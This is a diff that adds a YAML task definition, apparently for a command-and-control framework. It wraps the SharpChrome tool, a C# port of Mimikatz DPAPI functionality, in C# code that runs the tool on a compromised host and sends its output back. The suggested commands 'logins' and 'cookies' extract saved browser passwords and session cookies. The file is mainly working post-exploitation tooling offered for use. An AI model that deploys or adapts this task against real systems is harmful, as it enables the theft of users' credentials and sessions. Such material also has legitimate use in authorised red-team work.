@@ -1,0 +1,134 @@
+- Name: SharpChrome
+  Aliases: []
+  Author:
+    Name: OL
+    Handle: 
+    Link: 
+  Description: Use a SharpChrome command.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net40
+  - Net35
+  Code: |
+    using System;
+    using System.IO;
+
+    using SharpChrome.Domain;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+        public static string Execute(string Command = "")
+        {
+            try
+            {
+                TextWriter realStdOut = Console.Out;
+                TextWriter realStdErr = Console.Error;
+                StreamWriter stdOutWriter = new StreamWriter(OutputStream);
+                StreamWriter stdErrWriter = new StreamWriter(OutputStream);
+                stdOutWriter.AutoFlush = true;
+                stdErrWriter.AutoFlush = true;
+                Console.SetOut(stdOutWriter);
+                Console.SetError(stdErrWriter);
+                
+                string[] args = Command.Split(' ');
+                Info.ShowLogo();
+
+                // try to parse the command line arguments, show usage on failure and then bail
+                var parsed = ArgumentParser.Parse(args);
+                if (parsed.ParsedOk == false)
+                    Info.ShowUsage();
+                else
+                {
+                    // Try to execute the command using the arguments passed in
+
+                    var commandName = args.Length != 0 ? args[0] : "";
+
+                    var commandFound = new CommandCollection().ExecuteCommand(commandName, parsed.Arguments);
+
+                    // show the usage if no commands were found for the command name
+                    if (commandFound == false)
+                        Info.ShowUsage();
+                }
+                
+                Console.Out.Flush();
+                Console.Error.Flush();
+                Console.SetOut(realStdOut);
+                Console.SetError(realStdErr);
+                
+                OutputStream.Close();
+                return "";
+            }
+            catch (Exception e)
+            {
+              if (OutputStream != null)
+              {
+                OutputStream.Close();
+              }
+              return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace;
+            }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: true
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: SharpChrome command to execute.
+    SuggestedValues:
+    - logins
+    - cookies
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpChrome
+    Description: SharpChrome is a C# port of some Mimikatz DPAPI functionality.
+    Location: SharpDPAPI/SharpChrome
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Security.dll
+      Location: net40/System.Security.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Security.dll
+      Location: net35/System.Security.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Data.dll
+      Location: net35/System.Data.dll
+      DotNetVersion: Net35
+    - Name: System.Data.dll
+      Location: net40/System.Data.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
